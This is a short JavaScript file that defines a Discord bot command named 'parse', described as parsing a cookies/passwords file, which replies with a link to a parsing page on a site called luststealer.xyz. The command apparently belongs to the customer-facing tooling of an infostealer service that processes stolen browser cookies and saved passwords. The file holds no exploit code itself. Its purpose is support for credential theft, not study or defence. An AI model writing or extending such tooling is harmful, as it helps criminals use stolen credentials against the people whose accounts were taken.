import discord from "discord.js";
import undici from "undici";

export default {
  name: "parse",
  description: "Parse a cookies/passwords file",
  type: discord.ApplicationCommandType.ChatInput,
  run: async (client, interaction, config) => {
    await interaction.reply(
      `You can parse your files at https://www.luststealer.xyz/parse`
    );
  }
};
//`You can parse your files at ${config.baseURL}/parse`